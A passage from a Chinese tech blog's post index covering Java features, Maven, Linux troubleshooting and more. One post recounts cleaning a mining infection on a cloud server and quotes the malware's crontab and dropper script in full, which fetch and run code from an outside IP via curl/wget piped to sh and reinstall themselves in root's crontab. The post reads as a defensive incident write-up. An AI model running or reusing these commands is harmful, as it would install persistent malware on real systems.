总结遵守了上面提到了设计原则，我们的代码健壮性更强，可扩展性也更好，减少了代码的出错率。设计模式，就是基于上述的7大原则，形成的一套招式，其中比较典型的就是桥梁模式。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"}]},{"title":"Linux服务器病毒查杀经过","slug":"linux-virus","date":"2019-12-16T03:22:47.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/12/16/linux-virus/","link":"","permalink":"http://www.hasfun.cn/2019/12/16/linux-virus/","excerpt":"","text":"概述手上一个阿里云的服务器，最近发现CPU占用率飙高，有190.7%，影响了服务器的性能。 top一下系统的进程占用情况，发现有个不知名的进程Donald一直占用CPU，将进程杀死，还有执行程序删除后，过段时间，执行程序又会自动生成，并且自动启动了，当时推测有个定时任务自动去其他服务器自动下载可执行病毒程序。装了iftop软件检测异常网络流量，无果。最后推测是否这个病毒是否存在一个守护进程在检测和生成这个可执行病毒程序，结果是解决了这个病毒。 [root@izuf63bc56k6c8viz98bd1z ~]# top PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 32448 root 20 0 304956 268232 1476 S 190.7 6.9 4:05.54 Donald 第一次排查系统中毒，问题比较棘手，花了2天，解决了。特此记录下，方便后续参考。 解决过程 查询进程的执行程序 [root@izuf63bc56k6c8viz98bd1z ~]# cd /proc/32448 [root@izuf63bc56k6c8viz98bd1z 32448]# ll lrwxrwxrwx 1 root root 0 Dec 15 01:21 exe -&gt; /tmp/Donald 可以看到这个可以病毒的执行程序是Donald，位于/tmp 下。 杀死可疑进程 在top执行结果界面中，按K，输入32448，再enter下，即是kill -9 32448的效果。 再删除病毒程序 [root@izuf63bc56k6c8viz98bd1z 11770]# rm -rf /tmp/Donald 过段时间，又会生成/tmp/Danold ,开始定位原因。 ①crontab任务 [root@izuf63bc56k6c8viz98bd1z ~]# crontab -l -u root */15 * * * * (/usr/bin/yvqbfa8||/usr/libexec/yvqbfa8||/usr/local/bin/yvqbfa8||/tmp/yvqbfa8||curl -m180 -fsSL &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh 可以看见有个crontab任务在执行下载，读了一下，好像跟Donald无关。读了一下http://218.93.239.148:5071/i.sh下载的文件， export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin mkdir -p /var/spool/cron/crontabs echo &quot;&quot; &gt; /var/spool/cron/root echo &quot;*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -fsSL -m180 &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh&quot; &gt;&gt; /var/spool/cron/root cp -f /var/spool/cron/root /var/spool/cron/crontabs/root cd /tmp touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/ touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/ touch /usr/bin/writeable &amp;&amp; cd /usr/bin/ rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable export PATH=$PATH:$(pwd) ps auxf | grep -v grep | grep gewqfa8 || rm -rf gewqfa8 if [ ! -f &quot;gewqfa8&quot; ]; then curl -fsSL -m1800 &lt;http://218.93.239.148:5071/static/4008/ddgs.$&gt;(uname -m) -o gewqfa8||wget -q -T1800 &lt;http://218.93.239.148:5071/static/4008/ddgs.$&gt;(uname -m) -O gewqfa8 fi chmod +x gewqfa8 /usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8 ps auxf | grep -v grep | grep gewqbcb | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqbcc | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqbcd | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqbce | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqfa0 | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqfa1 | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqfa2 | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqfa3 | awk &#39;{print $2}&#39; | xargs kill -9 ps auxf | grep -v grep | grep gewqfa4 | awk &#39;{print $2}&#39; | xargs kill -9 echo &quot;*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -m180 -fsSL &lt;http://218.93.239.148:5071/i.sh||wget&gt; -q -T180 -O- &lt;http://218.93.239.148:5071/i.sh&gt;) | sh&quot; | crontab - 源码大概意思是，下载一个ddgs.x86_32 文件另存为 gewqfa8,执行gewqfa8生成yvqbfa8进程，会在tmp生成Donald执行程序，如果没有则会创建并且执行。很狡猾这个黑客，进程名换了几个，我vi gewqfa8 和 Donald 想读下病毒是怎么写的，可是源码被混淆了，黑客这样做是为了躲过一些杀毒软件的查杀吧。 ②可疑守护进程yvqbfa8 [root@izuf63bc56k6c8viz98bd1z ~]# top PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 32448 root 20 0 304956 268232 1476 S 190.7 6.9 4:05.54 Donald 31906 root 20 0 185484 109744 208 S 31.6 2.8 2:56.30 yvqbfa8 [root@izuf63bc56k6c8viz98bd1z bin]# kill -9 31906 再观察已经没有再生成Donald程序了。回头分析一下crontab任务，每15s执行下/usr/local/bin/yvqbfa8，yvqbfa8这个文件有点猫腻，可是vi 出来是乱码，是shell脚本被黑客混淆了，目前没找到方案解混淆。 解决方案kill 病毒进程，删除crontab任务，删除执行文件gewqfa8，Donald","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.hasfun.cn/tags/Linux/"}]},{"title":"jdk13新特性","slug":"jdk13-new-feature","date":"2019-12-11T08:48:52.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/12/11/jdk13-new-feature/","link":"","permalink":"http://www.hasfun.cn/2019/12/11/jdk13-new-feature/","excerpt":"","text":"2019年09月17日，JCP如期半年一更的约定，jdk迎来了新的版本jdk13.这里记录下新特性中比较亮眼的2个特性，方便后续查阅。详细的新特性参考jdk13。 text block 省去了很多转义 @Test public void textBlock(){ String sql = &quot;&quot;&quot; select * from system_user where user_id = &#39;543255&#39; and age &gt;12 and birth&gt;&#39;1991&#39; &quot;&quot;&quot;; String html = &quot;&quot;&quot; ..............&lt;html&gt; .............. &lt;body&gt; .............. &lt;p&gt;Hello, world&lt;/p&gt; .............. &lt;/body&gt; ..............&lt;/html&gt; ..............&quot;&quot;&quot;; System.out.println(html); System.out.println(sql); } 增强switch,支持yield设置返回 /** * jdk12 * @throws IOException */ @Test public void switchFeature() throws IOException { switch (&quot;A&quot;) { case &quot;A&quot; -&gt; System.out.println(&quot;you is A&quot;); case &quot;B&quot; -&gt; System.out.println(&quot;you is B&quot;); } } /** * jdk13 * @throws IOException */ @Test public void switchFeature2() throws IOException { String a = &quot;A&quot;; var result = switch (a) { case &quot;A&quot; :yield &quot;1&quot;; case &quot;B&quot;: yield &quot;2&quot;; default: throw new IllegalStateException(&quot;Unexpected value: &quot; + a); }; System.out.println(result); }","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Java新特性","slug":"Java新特性","permalink":"http://www.hasfun.cn/tags/Java新特性/"}]},{"title":"查询dubbo服务在zookeeper的部署情况","slug":"zookeeper-command","date":"2019-11-27T04:41:11.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/11/27/zookeeper-command/","link":"","permalink":"http://www.hasfun.cn/2019/11/27/zookeeper-command/","excerpt":"","text":"公司没有部署dubbo的admin界面，只能学会去生产机器用命令行排查问题。故做下记录，以便后续排查问题使用。 先进到zk的服务器，在shell里面敲命令，进入zk的命令界面 [test@FZ-KAFKA-61-72 bin]$ ./zkCli.sh -server 127.0.0.1:2181 然后，会出现 Connecting to 127.0.0.1:2181 ..... Welcome to ZooKeeper! [zk: 127.0.0.1:2181(CONNECTED) 0] 接下来，就可以查询dubbo服务的节点了 [zk: 127.0.0.1:2181(CONNECTED) 0] ls / [brokers, zookeeper, dubbo, consumers, config] 查询dubbo服务的所有暴露的服务接口 [zk: 127.0.0.1:2181(CONNECTED) 0] ls /dubbo [com.hcw.user.provider.api.service.UserAccountDubboService] 查询某个服务的提供者与消费者的注册情况 [zk: 127.0.0.1:2181(CONNECTED) 0] ls /dubbo/com.hcw.user.provider.api.service.UserAccountDubboService/providers [dubbo%3A%2F%2F192.168.61.99%3A20891%2Fcom.hcw.api.QSearchService%3Fanyhost%3Dtrue%26application%3Desh-provider%26dubbo%3D2.5.3%26interface%3Dcom.hcw.api.QSearchService%26logger%3Dslf4j%26methods%3DfindStockDoc%26pid%3D18460%26revision%3D0.0.2-SNAPSHOT%26side%3Dprovider%26threads%3D100%26timestamp%3D1572509354829] [zk: 127.0.0.1:2181(CONNECTED) 0] ls /dubbo/com.hcw.user.provider.api.service.UserAccountDubboService/consumers [consumer%3A%2F%2F192.168.61.114%2Fcom.hcw.api.QService%3Fapplication%3Dexam-consumer%26category%3Dconsumers%26check%3Dfalse%26dubbo%3D2.5.3%26interface%3Dcom.hcw.api.QSearchService%26logger%3Dslf4j%26methods%3DfindDocument%2Cf]","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"dubbo","slug":"dubbo","permalink":"http://www.hasfun.cn/tags/dubbo/"}]},{"title":"Linux磁盘不足排查过程","slug":"no-space-left-on-device","date":"2019-10-23T06:32:23.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/10/23/no-space-left-on-device/","link":"","permalink":"http://www.hasfun.cn/2019/10/23/no-space-left-on-device/","excerpt":"","text":"今天，群里面有人@我服务挂了，群里都是公司那些老资格的大佬，心里一揪，还好是开发环境。我故作镇定的说，我看看，我打开Linux服务器，shell里面敲了服务状态命令，的确是挂了。于是我先重启，报错提示no space left on device。看这意思是没有空间了，不知道是内存没有空间了还是磁盘没有空间了，英语不好，于是只能轮流试一下 [root@storm bin] free -m total used free shared buffers cached Mem: 7983 4943 3039 0 132 183 -/+ buffers/cache: 4628 3354 Swap: 2015 1409 606 可见内存还剩3G。排除了内存，十有八九是磁盘了。于是敲下命令 [root@storm bin] df -h Filesystem Size Used Avail Use% Mounted on /ttt/pda1 47G 47G 0M 100% / 的确是磁盘满了，那么是哪里的文件占用了大量的磁盘空间呢?估计是应用日志。还是敲命令定位一下,因/为我们服务放在/opt/app下，所以从这个目录找起 [root@storm bin] du -sh /opt/app |grep G 38G /opt/app [root@storm bin] du -sh /opt/app/* |grep G 20G /opt/app/message_plateform 11G /opt/app/question-h-cache 到此，占据内存的罪魁祸首找到了。磁盘总共47G，message_plateform，question-h-cache这2个服务就占据了31G。联系系统owner解决掉。那么问题来了，如何防止此类问题？ 第一个就是运维写个脚步本，定期清理过期日志文件； 第二个logback提供自动压缩归档日志文件，自动清除旧的日志归档文件。 另外，可能出现磁盘空间足够，导致文件生成失败还有另一个原因，就是文件索引节点inode已满 [root@storm bin] df -i Filesystem Inodes IUsed IFree IUse% Mounted on /dev/mapper/dev01-root 4964352 4964352 0 100% / udev 503779 440 503339 1% /dev tmpfs 506183 353 505830 1% /run none 506183 5 506178 1% /run/lock none 506183 2 506181 1% /run/shm /dev/sda1 124496 255 124241 1% /boot inodes 占用100%","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.hasfun.cn/tags/Linux/"}]},{"title":"利用IDEA批量重命名","slug":"cleanbadnaming","date":"2019-10-10T02:47:44.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/10/10/cleanbadnaming/","link":"","permalink":"http://www.hasfun.cn/2019/10/10/cleanbadnaming/","excerpt":"","text":"写代码需要有匠心，对于命名规范，作为一个逼格程序员的重要素质。工欲善其身，必先利其器，IDEA提供了Spellchecker检测错误命名的提示，当我们看到如下绿色波浪线，这是在提示需要修改不友好的命名了。 那么如果我们敲了很久的代码，才发现某些变量不规范，而很多地方引用的话。如何利用idea批量修改变量名呢。今天才意识到idea提供的rename功能， 选中修改对象： shift + F6 然后会发现，选中的code被一个红框圈起来了， 这时将新的名字输入，然后回车，文件中所有该变量的名字就都被修改好了。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"IDEA技巧","slug":"IDEA技巧","permalink":"http://www.hasfun.cn/tags/IDEA技巧/"}]},{"title":"Java7,8,9,10,11,12新特性","slug":"java-procee","date":"2019-09-30T05:54:58.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/09/30/java-procee/","link":"","permalink":"http://www.hasfun.cn/2019/09/30/java-procee/","excerpt":"","text":"Java9之后，JCP执行委员会提出将Java的发布频率改为每六个月一次。现在Java已经更新到Java 12了，可是我还停留在Java8上，不得不感慨程序员要保持学习，才能不会被淘汰啊。 版本 发布时间 特性 Java7 2011年7月28日 NIO，捕获多个异常，jcmd替代jps，fork/join，Java Mission Control（类似JVisualVm），Files Java8 2014年3 月18日 Lambda 表达式 − Lambda允许把函数作为一个方法的参数（函数作为参数传递进方法中），Stream API，HashMaps性能提升（红黑树），Date Time API，StampedLock，Optional，默认方法 − 默认方法就是一个在接口里面有了一个实现的方法；方法引用 − 方法引用提供了非常有用的语法，可以直接引用已有Java类或对象（实例）的方法或构造器。与lambda联合使用，方法引用可以使语言的构造更紧凑简洁，减少冗余代码；Nashorn, JavaScript 引擎 − Java 8提供了一个新的Nashorn javascript引擎，它允许我们在JVM上运行特定的javascript应用；静态方法 Java9 2017年9 月22日 模块系统：模块是一个包的容器，Java 9 最大的变化之一是引入了模块系统（Jigsaw 项目），REPL (JShell)：交互式编程环境；G1成为默认垃圾回收器，HTTP 2 客户端，同时改进httpclient的api，支持异步模式，jshell，docker方面支持，集合工厂方法（list,map,set）加入of，改进的 Javadoc：Javadoc 现在支持在 API 文档中的进行搜索。另外，Javadoc 的输出现在符合兼容 HTML5 标准；私有接口方法：在接口中使用private私有方法。我们可以使用 private 访问修饰符在接口中编写私有方法。轻量级的 JSON API：内置了一个轻量级的JSON API；响应式流（Reactive Streams) API: Java 9中引入了新的响应式流 API 来支持 Java 9 中的响应式编程；进程 API: 改进的 API 来控制和管理操作系统进程。引进 java.lang.ProcessHandle 及其嵌套接口 Info 来让开发者逃离时常因为要获取一个本地进程的 PID 而不得不使用本地代码的窘境。 Java10 2018年3 月21日 局部变量类型推断支持var 局部变量，GC改进，线程本地握手 Java11 2018年9 月25日 lombda表达式增强，string增加若干方法，纳入httpclient纳入Java的net包，将java9标记废弃的Java EE及CORBA模块移除掉，httpclient正式启用改为java.net.http模块，允许lambda表达式使用var变量,ZGC可扩展的低延迟垃圾收集器 Java12 2019年3 月19日 Shenandoah：一个低停顿垃圾收集器（实验阶段），Switch 表达式扩展，改善 G1 垃圾收集器 总结下，Java8目前企业使用较多，其次是Java 11，其他版本没有特殊变化。Java10 之后，可以使用Java，像JavaScript一样声明局部变量，极大的简化了开发编写速度。 如下： public class TestJava11 { @Test public void test1(){ var words = List.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;); //初始化list var tempMap = Map.of(&quot;a&quot;,12,&quot;b&quot;,14); //初始化MAP var tempSet = Set.of(&quot;1&quot;,&quot;2&quot;,&quot;4&quot;); //初始化set } } Java11 将httpclient正式归于net包中,同时支持异步调用，以及http/2 最新的http协议 @Test public void test() throws Exception { HttpClient client = HttpClient.newBuilder() .version(HttpClient.Version.HTTP_1_1) .followRedirects(HttpClient.Redirect.NORMAL) .connectTimeout(Duration.ofSeconds(20)) // .proxy(ProxySelector.of(new InetSocketAddress(&quot;www.baidu.com&quot;, 80))) //.authenticator(Authenticator.getDefault()) .build(); HttpRequest request = HttpRequest.newBuilder() .uri(URI.create(&quot;https://www.baidu.com&quot;)) .timeout(Duration.ofMinutes(2)) .header(&quot;Content-Type&quot;, &quot;text/html&quot;) //.POST(HttpRequest.BodyPublishers.ofString(&quot;&quot;, StandardCharsets.UTF_8)) .GET() .build(); HttpResponse&lt;String&gt; response = client.send(request, HttpResponse.BodyHandlers.ofString()); System.out.println(response.statusCode()); System.out.println(response.body()); client.sendAsync(request, HttpResponse.BodyHandlers.ofString()) .thenApply(HttpResponse::body) .thenAccept(System.out::println); System.in.read(); } 不多说了，后面用起来。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Java新特性","slug":"Java新特性","permalink":"http://www.hasfun.cn/tags/Java新特性/"}]},{"title":"【在线工具】修炼打字速度","slug":"typing","date":"2019-09-25T10:06:05.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/09/25/typing/","link":"","permalink":"http://www.hasfun.cn/2019/09/25/typing/","excerpt":"","text":"闲暇时间，练一把，听着键盘的打字声，很舒畅很悦耳 在线修炼打字速度","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"打字","slug":"打字","permalink":"http://www.hasfun.cn/tags/打字/"}]},{"title":"maven多继承父pom","slug":"maven","date":"2019-09-23T10:58:37.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/09/23/maven/","link":"","permalink":"http://www.hasfun.cn/2019/09/23/maven/","excerpt":"","text":"maven工程在管理项目模块关系方面，提供了方便。比如定义一个pom文件，作为父级pom，管理多个模块module，这样的好处，可以用pom管理子模块的jar的版本号，子模块不需要声明jar的版本，假如后期升级jar版本只需要修改pom的版本号即可，配置如下： 定义父POM &lt;groupId&gt;cn.hasfun&lt;/groupId&gt; &lt;artifactId&gt;hasfun-pom&lt;/artifactId&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;name&gt;hasfun-pom&lt;/name&gt; &lt;modules&gt; &lt;module&gt;hasfun-common&lt;/module&gt; &lt;module&gt;hasfun-web&lt;/module&gt; &lt;module&gt;hasfun-question&lt;/module&gt; &lt;module&gt;hasfun-db&lt;/module&gt; &lt;module&gt;hasfun-page&lt;/module&gt; &lt;module&gt;hcw-netty-springmvc&lt;/module&gt; &lt;module&gt;hcw-net-framework&lt;/module&gt; &lt;module&gt;test&lt;/module&gt; &lt;/modules&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;spring-webmvc.version&gt;4.1.4.RELEASE&lt;/spring-webmvc.version&gt; &lt;spring-context.version&gt;4.1.4.RELEASE&lt;/spring-context.version&gt; &lt;spring-web.version&gt;4.1.4.RELEASE&lt;/spring-web.version&gt; &lt;spring-test.version&gt;4.1.4.RELEASE&lt;/spring-test.version&gt; &lt;/properties&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- SpringMVC 配置开始--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;${spring-webmvc.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring-context.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;${spring-web.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring-test.version}&lt;/version&gt; &lt;/dependency&gt; ... &lt;/dependencies&gt; &lt;/dependencyManagement&gt; 子模块 &lt;parent&gt; &lt;artifactId&gt;hasfun-pom&lt;/artifactId&gt; &lt;groupId&gt;cn.hasfun&lt;/groupId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;/dependency&gt; ... &lt;/dependencies&gt; 如上，是定义了一个父pom，与子模块的单继承关系。今天遇到项目里面需要继承公司的底层pom，可是我又想继承自定义pom，又如何实现多继承？父POM，自定义POM继承父POM，子模块再继承自定义pom。今天研究了一下，只需要这样写： &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;1.5.2.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt;","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"maven","slug":"maven","permalink":"http://www.hasfun.cn/tags/maven/"}]},{"title":"装箱与拆箱的性能差距","slug":"javabox","date":"2019-09-05T11:42:31.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/09/05/javabox/","link":"","permalink":"http://www.hasfun.cn/2019/09/05/javabox/","excerpt":"","text":"今天读同事的代码，了解到Java拆箱与装箱对性能差距很大。首先，复习下装箱与拆箱的概念，说白了就是包装类型，与基础类型的转换，记得没错的话，这是Java的语法糖。 装箱int i =0 ; Integer j = i; 拆箱Integer i = 0; int j = j; 下面，分别执行使用装箱与拆箱的程序，和没有装拆箱的程序： // 装箱 public void boxTest() { long startTime = System.currentTimeMillis(); Long sum = 0L; for (long i = 0; i &lt; Integer.MAX_VALUE; i++) { sum = i; } System.out.println(&quot;processing time: &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;); } 打印结果： processing time: 7808 ms // 不装箱 public void unBoxTest() { long startTime = System.currentTimeMillis(); long sum = 0L; for (long i = 0; i &lt; Integer.MAX_VALUE; i++) { sum = i; } System.out.println(&quot;processing time: &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;); } 执行结果： processing time: 1589 ms 对比下，惊呆了，可以相差6S。如果追求极致的性能的服务器，这块平日开发的时候，还是可以注意一下，可以优化性能。那么为什么装箱拆箱性能有影响呢，具体原因是，int i = 0; Integer j = i; 虚拟机会转成 int i =0 ; Integer j = new Integer(i); 那么可想而知，循环体，一直new Integer(),不断的GC。 好了，写到这里。今天还是有收获的。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"装箱与拆箱","slug":"装箱与拆箱","permalink":"http://www.hasfun.cn/tags/装箱与拆箱/"}]},{"title":"解决服务器宕机重启，Java服务不能自启动的问题","slug":"wrapper-service","date":"2019-08-21T07:24:27.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/08/21/wrapper-service/","link":"","permalink":"http://www.hasfun.cn/2019/08/21/wrapper-service/","excerpt":"","text":"JAVA程序发布的时候，最常见的是会编译成war包，又或者jar包。 war包是用来发布带网页JSP等的程序，而只是一些Java和配置文件组成的服务程序只需要jar则可以，war部署在Tomcat下面，jar包只要在命令行敲个命令 java -jar demo.jar 则可，多么清晰干脆。命令行操作，带来二个问题 1:运营人员不小心关闭了命令行，服务则关闭了，这种在window下常见 2:当服务器异常重启，Java服务是不能自动重启的，那么怎么解决呢？ Java Service Wrapperwrapper 包装的意思，就是将jar包装成windows或者Linux的服务，这样服务器重启也会随着服务器服务一起重启。 使用java service wrapper 只需要简单的配置，无需添加任何代码，无侵入性。 Java Service Wrapper 入手很简单，主要有以下几个目录 - demo-service -bin # 启动demo服务的地方 - run.sh # 启动文件 - wrapper #wrapper系统文件 -lib # 将demo服务的jar放进来 - wrapper.jar - libwrapper.so - logback** -conf # 启动demo的一些配置文件 -wrapper.conf # wrapper配置文件 -logback.xml # logback日志配置 -logs # demo服务的日志 - demo-20190821.log #应用日志 - wrapper-2019-08-21.log #wrapper日志 run.sh *******省略*********************** # Wrapper WRAPPER_CMD=&quot;./wrapper&quot; WRAPPER_CONF=&quot;../conf/wrapper.conf&quot; *******省略*********************** 2：wrapper.conf **** wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleApp set.default.REPO_DIR=lib # 设置LIB环境变量 set.APP_BASE=. # Java Classpath (include wrapper.jar) Add class path elements as # needed starting from 1 wrapper.java.classpath.1=lib/wrapper.jar wrapper.java.classpath.2=%REPO_DIR%/* # 指定LIB目录 # Java Library Path (location of Wrapper.DLL or libwrapper.so) wrapper.java.library.path.1=lib # Java Bits. On applicable platforms, tells the JVM to run in 32 or 64-bit mode. wrapper.java.additional.auto_bits=TRUE # Java Additional Parameters wrapper.java.additional.1=-Dlogback.configurationFile=file:conf/logback.xml # 指定日志配置文件 # Initial Java Heap Size (in MB) wrapper.java.initmemory=256 # 指定JAVA堆初始化大小 # Maximum Java Heap Size (in MB) wrapper.java.maxmemory=1024 # 指定JAVA堆最大内存 # Application parameters. Add parameters as needed starting from 1 wrapper.app.parameter.1=cn.hcw.gc.GcExample # 指定main函数 #******************************************************************** # Wrapper Logging Properties #******************************************************************** # Enables Debug output from the Wrapper. # wrapper.debug=TRUE # Format of output for the console. (See docs for formats) wrapper.console.format=PM # Log Level for console output. (See docs for log levels) wrapper.console.loglevel=INFO # Log file to use for wrapper output logging. wrapper.logfile=logs/wrapper-YYYYMMDD.log # 指定系统日志格式 wrapper.logfile.rollmode=DATE # 指定日志按日期分割 # Format of output for the log file. (See docs for formats) wrapper.logfile.format=LPTM # Log Level for log file output. (See docs for log levels) wrapper.logfile.loglevel=INFO # Maximum size that the log file will be allowed to grow to before # the log is rolled. Size is specified in bytes. The default value # of 0, disables log rolling. May abbreviate with the &#39;k&#39; (kb) or # &#39;m&#39; (mb) suffix. For example: 10m = 10 megabytes. wrapper.logfile.maxsize=500 # 指定日志文件内存最大大小 *******省略*********************** # Name of the service wrapper.name=demo-app-service # Display name of the service wrapper.displayname=demo-app-service Application # Description of the service wrapper.description=demo-app-service Description # Service dependencies. Add dependencies as needed starting from 1 wrapper.ntservice.dependency.1= # Mode in which the service is installed. AUTO_START, DELAY_START or DEMAND_START wrapper.ntservice.starttype=AUTO_START # Allow the service to interact with the desktop (Windows NT/2000/XP only). wrapper.ntservice.interactive=FALSE 以上文件可以参加源码下载运行，至此，Java Service Wrapper 搭建成功，服务可以启动了。 在Linux下执行命令 ./run.sh start # 启动 ./run.sh status # 服务运行状态 ./run.sh stop #停止服务 源码Java Service Wrapper","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"棉花糖","slug":"棉花糖","permalink":"http://www.hasfun.cn/tags/棉花糖/"}]},{"title":"关于BigDecimal除法的踩坑记录","slug":"decimal","date":"2019-08-15T06:56:38.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/08/15/decimal/","link":"","permalink":"http://www.hasfun.cn/2019/08/15/decimal/","excerpt":"","text":"最近比较忙，很久没有更博了。最近做的一个证券类的猜涨跌活动的项目，涉及到了计算百分比，用到了decimal这个精度比较高的类（float，double计算会丢失精度），程序在测试阶段，出现了错误 java.lang.ArithmeticException: Non-terminating decimal expansion; no exact representable decimal result。报错的代码是： BigDecimal successRate = new BigDecimal(successTimes).divide(new BigDecimal(totalJoinTimes)).setScale(2,BigDecimal.ROUND_HALF_UP); 这里就体现你英语水平的地方了，如果报错日志看不懂， 估计你还得去网上搜下此类错误原因，反之，通过报错日志，就能定位到问题，Non-terminating 无止境的，no exact 不是期望的，大概意思就是 除出的结果是个无限循环小数，不是确切的decimal值。所以，用BigDecimal.divide(),要特别注意在方法内，设置保留几位小数，正确的写法是： BigDecimal successRate = new BigDecimal(successTimes).divide(new BigDecimal(totalJoinTimes),2,BigDecimal.ROUND_HALF_UP); 总结一下，其实以前也遇到过这类问题，就是没有及时总结，导致这一次又犯了一次，特此立个flag，以后不会重蹈覆辙。 这里特别提下： 在《Effective Java》这本书中也提到这个原则，float和double只能用来做科学计算或者是工程计算，在商业计算中我们要用java.math.BigDecimal。使用BigDecimal并且一定要用String来够造。 至于为什么？ 是因为float与double 